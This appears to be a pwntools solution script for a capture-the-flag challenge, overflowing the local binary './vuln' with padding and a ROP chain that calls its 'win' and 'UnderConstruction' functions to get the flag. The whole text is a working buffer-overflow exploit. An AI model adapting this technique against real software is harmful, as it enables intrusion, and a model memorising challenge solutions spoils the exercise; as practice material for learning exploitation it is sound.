from pwn import *
context.clear(arch='i386')
elf = ELF('./vuln')

rop = ROP(elf)
rop.raw("A" * 0xe)
rop.call(elf.sym.win)
rop.call(elf.sym.UnderConstruction)
p = process('./vuln')
p.recvuntil(b"Give me a string that gets you the flag\n")
p.send(rop.chain())
p.interactive()

# convert hex data to string
